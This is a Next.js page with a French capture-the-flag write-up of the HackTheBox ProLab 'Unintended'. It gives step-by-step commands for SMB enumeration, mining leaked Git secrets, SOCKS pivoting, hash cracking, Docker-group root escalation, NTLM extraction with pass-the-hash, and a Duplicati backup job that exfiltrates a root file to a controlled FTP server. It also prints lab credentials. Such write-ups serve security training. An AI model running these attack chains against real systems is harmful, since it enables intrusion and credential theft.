import Image from "next/image";
import Link from "next/link";
import { Network, GitBranch, Database, Key, Shield, Server, Lock } from "lucide-react";
import { RevealFlagBlock } from "@/components/RevealFlag";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Unintended | Writeup ProLab HTB | 0xbbuddha",
  description:
    "Writeup du Mini ProLab HackTheBox Unintended : enumeration AD non authentifiée, secrets dans l'historique Gitea, pivot SOCKS via SFTP jusqu'à MySQL et PostgreSQL/Mattermost, privesc Docker, forensics d'un backup Samba AD et abus d'une instance Duplicati live.",
};

export default function WriteupUnintendedPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <header className="mb-8 border-b border-border pb-6">
        <div className="flex items-start justify-between gap-6">
          <div className="min-w-0 flex-1">
            <nav className="mb-3 flex flex-wrap items-center gap-1 text-xs text-muted-foreground">
              <Link href="/" className="transition-colors hover:text-foreground">README</Link>
              <span className="text-muted-foreground/40">›</span>
              <Link href="/writeups" className="transition-colors hover:text-foreground">Writeups</Link>
              <span className="text-muted-foreground/40">›</span>
              <span className="text-foreground/70">Unintended</span>
            </nav>
            <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Writeup ProLab</p>
            <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Unintended</h1>
            <p className="mt-3 text-sm leading-7 text-muted-foreground">
              Mini ProLab orienté Active Directory vu depuis un angle Linux. Migration AD bâclée, secrets qui
              traînent dans un historique Git, credentials réutilisés entre Gitea, Mattermost et le domaine,
              privesc Docker triviale, un forensic amusant d&apos;un backup Samba AD hors-ligne jusqu&apos;au
              Domain Admin, et abus d&apos;une instance Duplicati toujours en vie pour lire un fichier root sans
              jamais shell root.
            </p>
            <div className="mt-4 flex flex-wrap gap-x-5 gap-y-1">
              {[
                { label: "Platform", value: "HackTheBox Mini ProLabs" },
                { label: "Tier", value: "Red Team Operator I" },
                { label: "Domaine", value: "unintended.vl" },
                { label: "Hôtes", value: "DC / BACKUP / WEB" },
                { label: "Flags", value: "Touchdown / Web / Backup Admin / Unintended Master" },
                { label: "Date", value: "2026-07-18" },
              ].map((s) => (
                <div key={s.label} className="text-xs text-muted-foreground">
                  <span className="text-muted-foreground/60">{s.label}: </span>
                  <span>{s.value}</span>
                </div>
              ))}
            </div>
          </div>
          <Image
            src="/ic-unintended-overview.png"
            alt="Unintended ProLab"
            width={160}
            height={105}
            className="hidden shrink-0 rounded-xl sm:block"
            priority
          />
        </div>
      </header>

      <article className="mt-8 space-y-10">

        {/* ── 1. RECON ──────────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Network className="size-5 text-primary" />
            1. Reconnaissance réseau et énumération AD non authentifiée
          </h2>
          <p className="text-muted-foreground">
            Trois hôtes Linux dans le scope : un DC (Samba Active Directory), un serveur de backup, et un
            serveur web. Le scan complet sur les trois confirme un <strong>Samba AD DC</strong> classique côté
            DC (Kerberos, LDAP, SMB), un service FTP <strong>pyftpdlib</strong> côté BACKUP, et un simple
            Flask <em>&quot;Under Construction&quot;</em> côté WEB.
          </p>
          <CodeBlock title="Scan complet des 3 hôtes">
{`nmap 10.13.38.57-59 -Pn -p- -sT -T4 --min-rate 1000`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`DC      10.13.38.57  22,53,88,135,139,389,445,464,636,3268,3269,49152-49154  (Samba 4 AD DC)
BACKUP  10.13.38.58  21 (pyftpdlib 1.5.7), 22
WEB     10.13.38.59  22, 80 (Werkzeug/Flask "Under Construction")`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Une session SMB nulle sur le DC suffit à lister les comptes du domaine sans le moindre credential.
          </p>
          <CodeBlock title="Null session SMB">
{`nxc smb 10.13.38.57 -u '' -p '' --users
rpcclient -U '' -N 10.13.38.57 -c enumdomusers`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`Administrator, Guest, krbtgt, juan, abbie, cartor`}
          </CodeBlock>
        </section>

        {/* ── 2. GITEA ──────────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <GitBranch className="size-5 text-primary" />
            2. Vhosts + secrets dans l&apos;historique Gitea
          </h2>
          <p className="text-muted-foreground">
            Un fuzzing de vhosts sur WEB révèle deux applications internes : un <strong>Mattermost</strong> et
            un <strong>Gitea</strong>. Le dépôt public <code className="rounded bg-muted px-1">juan/DevOps</code>
            est accessible sans authentification, et son historique de commits contient des secrets qui ont
            été &quot;retirés&quot; dans un commit ultérieur, mais restent parfaitement lisibles via l&apos;API
            patch de Gitea (les blobs Git ne disparaissent jamais vraiment).
          </p>
          <CodeBlock title="Découverte de vhosts">
{`gobuster vhost -u http://10.13.38.59 --domain unintended.vl \\
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \\
  --append-domain -t 50

→ chat.unintended.vl  (Mattermost)
→ code.unintended.vl  (Gitea v1.21.3)`}
          </CodeBlock>
          <CodeBlock title="Lecture d'un commit soi-disant supprimé via l'API patch">
{`curl -H "Host: code.unintended.vl" \\
  http://10.13.38.59/juan/DevOps/commit/a9e6fedd32d307572ea9a567158716963c5608ea.patch`}
          </CodeBlock>
          <CodeBlock title="Résultat (Docker/web/Dockerfile-flask)" result>
{`ENV APP_SECRET 6SU28SH286DY8HS7D
ENV SFTP_USER ftp_user
ENV SFTP_PASS Th3_F1P_Account$$`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Ces identifiants ouvrent un accès SFTP-only sur WEB, parfait pour monter un tunnel SOCKS et
            pivoter vers les services internes qui ne sont pas exposés à l&apos;extérieur.
          </p>
          <CodeBlock title="Tunnel SOCKS via SFTP">
{`sshpass -p 'Th3_F1P_Account$$' ssh -D 1080 -N ftp_user@10.13.38.59`}
          </CodeBlock>
        </section>

        {/* ── 3. MYSQL GITEA + CRACK ADMIN ─────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            3. MySQL root:root, hash Gitea et flag Touchdown
          </h2>
          <p className="text-muted-foreground">
            Derrière le tunnel, MySQL répond en <strong>root:root</strong>. <code className="rounded bg-muted px-1">proxychains</code>
            plante systématiquement sur les connexions non bloquantes de MySQL dans cet environnement ; un relais
            <code className="rounded bg-muted px-1 mx-1">ncat</code> fait le travail sans broncher.
          </p>
          <CodeBlock title="Relais TCP local vers MySQL">
{`ncat -l 13306 --keep-open -c "ncat --proxy 127.0.0.1:1080 --proxy-type socks5 127.0.0.1 3306"
mysql -h 127.0.0.1 -P 13306 -u root -proot gitea \\
  -e "select id,name,email,passwd,passwd_hash_algo,salt,is_admin from user;"`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Hash PBKDF2-SHA256 de <strong>administrator</strong> (50000 itérations). Conversion au format hashcat
            10900 (<code className="rounded bg-muted px-1">sha256:iterations:salt_b64:hash_b64</code>) puis cassage
            sur rockyou.
          </p>
          <CodeBlock title="Cassage du hash">
{`hashcat -m 10900 -a 0 admin_gitea.hash rockyou.txt

→ administrator : loveandhate`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Connecté en admin Gitea, le panel <code className="rounded bg-muted px-1">/admin/repos</code> révèle un
            dépôt privé supplémentaire : <strong>juan/home-backup</strong>. Son <code className="rounded bg-muted px-1">.bash_history</code>
            contient la commande qui a généré sa clé SSH, avec la passphrase en clair.
          </p>
          <CodeBlock title=".bash_history du dépôt privé" result>
{`ssh-keygen -t rsa -b 4096 -C "juan@unintended.local" -N "theJUANman2019" -f ~/.ssh/id_rsa`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Cette passphrase est réutilisée telle quelle comme mot de passe du compte de domaine <strong>juan</strong>,
            validé via SMB puis directement en SSH sur WEB (joint au domaine via SSSD, contrairement au DC qui
            refuse le login interactif pour les comptes AD).
          </p>
          <CodeBlock title="Validation domaine et accès SSH">
{`smbclient -L //10.13.38.57/ -U 'juan%theJUANman2019'          # succès

sshpass -p 'theJUANman2019' ssh -l 'juan@unintended.vl' 10.13.38.59`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`uid=320201103(juan@unintended.vl) gid=320200513(domain users@unintended.vl)
groups=...,320201106(web developers@unintended.vl)
web.unintended.vl`}
          </CodeBlock>
          <RevealFlagBlock title="Flag : Touchdown">
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        {/* ── 4. MATTERMOST / ABBIE ────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            4. Pivot PostgreSQL/Mattermost et mot de passe d&apos;Abbie
          </h2>
          <p className="text-muted-foreground">
            Même tunnel SOCKS, nouveau relais vers le réseau Docker interne où vit la base Postgres de
            Mattermost.
          </p>
          <CodeBlock title="Relais vers Postgres (réseau docker interne)">
{`ncat -l 15432 --keep-open -c "ncat --proxy 127.0.0.1:1080 --proxy-type socks5 172.18.0.3 5432"
psql -h 127.0.0.1 -p 15432 -U mmuser -d mattermost -c "select username,email,password from users;"
psql -h 127.0.0.1 -p 15432 -U mmuser -d mattermost -c "select message from posts order by createat desc limit 200;"`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Trois comptes : <strong>cadams</strong> (cartor, admin), <strong>theabbs</strong> (Abbie Spencer),
            <strong> juank</strong> (juan). L&apos;historique des messages contient deux indices en or : un mot de
            passe temporaire donné en clair par cadams suite à une réinitialisation, et une blague sur un pattern
            de mot de passe faible en <em>nom+année de naissance</em>.
          </p>
          <CodeBlock title="Extraits de conversation" result>
{`cadams: Here, \`Hiu8sy8SA8h2\`, change it to one you can actually remember...
theabbs: Thank you soo much... (kidding)
[...] name + birthyear is a good password then? :joy:`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Le pattern se vérifie en cassant le hash bcrypt d&apos;Abbie - mais ce mot de passe Mattermost n&apos;est
            <strong> pas</strong> son mot de passe de domaine : celui-ci reste le mot de passe temporaire, jamais
            changé malgré la promesse.
          </p>
          <CodeBlock title="Cassage bcrypt (confirme le pattern, piste alternative)">
{`hashcat -m 3200 -a 0 abbie_bcrypt.hash abbie_wordlist.txt

→ theabbs (Mattermost) : Abbie1998`}
          </CodeBlock>
          <CodeBlock title="Le vrai mot de passe de domaine">
{`nxc smb 10.13.38.57 -u abbie -p 'Hiu8sy8SA8h2'

→ [+] unintended.vl\\abbie:Hiu8sy8SA8h2`}
          </CodeBlock>
        </section>

        {/* ── 5. BACKUP DOCKER PRIVESC ──────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Server className="size-5 text-primary" />
            5. Lateral movement vers BACKUP et privesc Docker
          </h2>
          <CodeBlock title="SSH avec le compte de domaine d'Abbie">
{`sshpass -p 'Hiu8sy8SA8h2' ssh -l 'abbie@unintended.vl' 10.13.38.58`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`uid=320201104(abbie@unintended.vl) gid=320200513(domain users@unintended.vl)
groups=320200513(domain users@unintended.vl),119(docker)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Membre du groupe local <strong>docker</strong> = root équivalent. Un montage du filesystem hôte
            dans un conteneur suivi d&apos;un <code className="rounded bg-muted px-1">chroot</code> donne un shell
            root complet en une commande.
          </p>
          <CodeBlock title="Privesc via montage + chroot">
{`docker run --rm -v /:/mnt python:3.11.2-slim chroot /mnt bash`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`uid=0(root) gid=0(root) groups=0(root)`}
          </CodeBlock>
        </section>

        {/* ── 6. SAMBA AD BACKUP + PTH ─────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            6. Forensic du backup Samba AD et Pass-the-Hash
          </h2>
          <p className="text-muted-foreground">
            Root sur BACKUP donne accès à un conteneur FTP contenant une sauvegarde complète de la base
            Active Directory Samba, prise en tarball des mois plus tôt.
          </p>
          <CodeBlock title="Localisation et exfiltration du backup">
{`docker ps -a
# scripts_ftp_1  python:3.11.2-slim  "sh ./setup.sh"

docker exec scripts_ftp_1 find /ftp -iname '*.tar.bz2'
# /ftp/volumes/domain_backup/samba-backup-2024-02-17T20-32-13.580437.tar.bz2

docker cp scripts_ftp_1:/ftp/volumes/domain_backup/samba-backup-*.tar.bz2 /tmp/samba-backup.tar.bz2`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Après exfiltration (scp) et extraction du tarball, <code className="rounded bg-muted px-1">ldbsearch</code>
            installé en local suffit à interroger directement la base <code className="rounded bg-muted px-1">sam.ldb</code>
            sans avoir besoin du conteneur officiel <code className="rounded bg-muted px-1">diegogslomp/samba-ad-dc</code>.
          </p>
          <CodeBlock title="Extraction du hash Administrator">
{`ldbsearch -H ./backup/private/sam.ldb -b 'dc=unintended,dc=vl' \\
  '(&(objectClass=user)(sAMAccountname=administrator))' unicodePwd

→ unicodePwd:: Nv4kHqDqpTPV+si9f7b4ow==`}
          </CodeBlock>
          <CodeBlock title="Conversion en hash NTLM">
{`echo 'Nv4kHqDqpTPV+si9f7b4ow==' | base64 -d | xxd -p
→ 36fe241ea0eaa533d5fac8bd7fb6f8a3`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Un backup vieux de plusieurs mois, mais le mot de passe Administrator n&apos;a jamais tourné entre
            temps : le hash extrait est encore valide en Pass-the-Hash sur le DC actuel.
          </p>
          <CodeBlock title="Pass-the-Hash sur le DC">
{`nxc smb 10.13.38.57 -u Administrator -H 36fe241ea0eaa533d5fac8bd7fb6f8a3
# [+] unintended.vl\\Administrator:36fe241ea0eaa533d5fac8bd7fb6f8a3

smbclient -U Administrator --password=36fe241ea0eaa533d5fac8bd7fb6f8a3 --pw-nt-hash //10.13.38.57/home -c "get root.txt"`}
          </CodeBlock>
          <RevealFlagBlock title="Flag : Backup Admin">
{`REDACTED`}
          </RevealFlagBlock>
          <RevealFlagBlock title="Flag : Unintended Master">
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        {/* ── 7. BONUS DUPLICATI ───────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Lock className="size-5 text-primary" />
            7. Flag Web : abus d&apos;une instance Duplicati live
          </h2>
          <p className="text-muted-foreground">
            Le conteneur FTP de BACKUP contient aussi les blocs d&apos;une sauvegarde Duplicati (non chiffrée,
            <code className="rounded bg-muted px-1 mx-1">--no-encryption</code>) de la configuration de
            Duplicati lui-même - une sauvegarde qui se sauvegarde elle-même. En parsant à la main le
            <code className="rounded bg-muted px-1 mx-1">filelist.json</code> du <code className="rounded bg-muted px-1">.dlist.zip</code>
            (sans <code className="rounded bg-muted px-1">duplicati-cli</code>, juste <code className="rounded bg-muted px-1">unzip</code>),
            je retrouve et restitue <code className="rounded bg-muted px-1">Duplicati-server.sqlite</code> à partir
            du bon <code className="rounded bg-muted px-1">.dblock.zip</code> (nom d&apos;entrée = hash SHA256 du bloc,
            en base64 url-safe).
          </p>
          <CodeBlock title="Table Option de la config restaurée" result>
{`server-passphrase       = ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk=
server-passphrase-salt  = j+7JQsuO7aggNAESQRkCBJd8dwdUE6A9QLTKXM3LB7w=
last-webserver-port     = 8200`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Port 8200 fermé de l&apos;extérieur, mais joignable en loopback sur WEB via le tunnel SOCKS déjà en
            place : une vraie instance Duplicati tourne toujours, avec le même salt que celui extrait du backup.
          </p>
          <CodeBlock title="Découverte du service live + nonce">
{`curl -x socks5h://127.0.0.1:1080 http://127.0.0.1:8200/login.cgi -X POST -d "get-nonce=1"`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Le protocole d&apos;auth legacy de Duplicati 2.0.x ne demande jamais le mot de passe en clair : il suffit
            de connaître <code className="rounded bg-muted px-1">server-passphrase</code> (déjà en main) pour calculer
            la réponse au challenge.
          </p>
          <CodeBlock title="Login par challenge-response, sans mot de passe en clair">
{`noncedpwd = base64( SHA256( base64decode(Nonce) || base64decode(server-passphrase) ) )
POST /login.cgi  password=<noncedpwd>  →  {"Status":"OK"}`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Authentifié sur l&apos;instance live, j&apos;abuse l&apos;API REST pour créer un nouveau job de sauvegarde
            ciblant directement <code className="rounded bg-muted px-1">/root/flag.txt</code> de WEB, avec pour
            destination un serveur FTP que je contrôle et peux atteindre directement (credentials
            <code className="rounded bg-muted px-1 mx-1">ftp_admin</code> trouvés dans la config d&apos;un job existant).
            Aucun shell root nécessaire : Duplicati lit le fichier à ma place.
          </p>
          <CodeBlock title="Nouveau job de sauvegarde ciblé + exécution">
{`POST /api/v1/backups   {"Sources": ["/source/root/flag.txt"], "TargetURL": "ftp://10.13.38.58:21//exfil?auth-username=ftp_admin&auth-password=..."}
POST /api/v1/backup/{id}/run`}
          </CodeBlock>
          <CodeBlock title="Récupération et extraction du bloc déposé sur le FTP contrôlé">
{`curl "ftp://10.13.38.58:21/exfil/duplicati-*.dblock.zip" --user ftp_admin:*** -o dblock.zip
unzip -p dblock.zip <block-hash>`}
          </CodeBlock>
          <RevealFlagBlock title="Flag : Web">
{`REDACTED`}
          </RevealFlagBlock>
        </section>

        {/* ── RECAP ─────────────────────────────────────────────────────── */}
        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Récap</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li><strong>Recon</strong> : session SMB nulle sur le DC → liste des comptes du domaine sans credentials</li>
            <li><strong>Gitea</strong> : dépôt public juan/DevOps → secrets dans un commit &quot;supprimé&quot;, toujours lisibles via l&apos;API patch → creds SFTP</li>
            <li><strong>Pivot SOCKS</strong> : tunnel SSH via le compte SFTP → MySQL root:root → hash Gitea admin cassé (loveandhate)</li>
            <li><strong>Flag Touchdown</strong> : dépôt privé juan/home-backup → .bash_history → passphrase SSH = mot de passe domaine de juan</li>
            <li><strong>Abbie</strong> : Postgres Mattermost (même pivot) → messages → mot de passe temporaire jamais changé (piste bcrypt name+birthyear = fausse piste)</li>
            <li><strong>Flag Backup Admin</strong> : SSH abbie → BACKUP → groupe docker → root via montage + chroot</li>
            <li><strong>Flag Unintended Master</strong> : backup Samba AD exfiltré → ldbsearch → hash NTLM Administrator → Pass-the-Hash → Domain Admin</li>
            <li><strong>Flag Web</strong> : backup Duplicati de sa propre config → passphrase → login sur l&apos;instance live → nouveau job ciblé sur /root/flag.txt → exfiltration via FTP contrôlé</li>
          </ul>
        </section>

      </article>
    </div>
  );
}
